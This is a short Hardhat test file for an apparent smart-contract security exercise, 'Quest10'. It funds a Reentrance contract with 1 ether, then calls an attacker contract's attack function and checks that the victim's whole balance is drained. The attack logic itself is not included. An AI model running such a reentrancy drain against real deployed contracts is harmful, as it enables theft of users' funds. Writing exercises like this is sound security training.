import { expect } from "chai";
import { ethers } from "hardhat";
import { Reentrance, Quest10 } from "../typechain";

describe("Quest10", () => {
  let reentrance: Reentrance;
  let quest10: Quest10;
  it("Should deploy Reentrance with 1 ether", async () => {
    const [owner] = await ethers.getSigners();

    const Reentrance = await ethers.getContractFactory("Reentrance");
    reentrance = await Reentrance.deploy();
    await reentrance.deployed();

    console.log("Reentrance address:", reentrance.address);

    // send 1 ether to Reentrance contract
    const TX = await owner.sendTransaction({
      to: reentrance.address,
      value: ethers.utils.parseEther("1"),
    });
    await TX.wait();

    expect(await ethers.provider.getBalance(reentrance.address)).to.equal(
      ethers.utils.parseEther("1")
    );

    const Quest10 = await ethers.getContractFactory("Quest10");
    quest10 = await Quest10.deploy();
    await reentrance.deployed();

    console.log("Quest10 address:", quest10.address);
  });

  it("Should stolen all ether from reentrance", async () => {
    const TX = await quest10.attack(reentrance.address, {
      gasLimit: 1000000,
      value: ethers.utils.parseEther("1"),
    });
    await TX.wait();

    expect(await ethers.provider.getBalance(reentrance.address)).to.equal(0);
  });
});
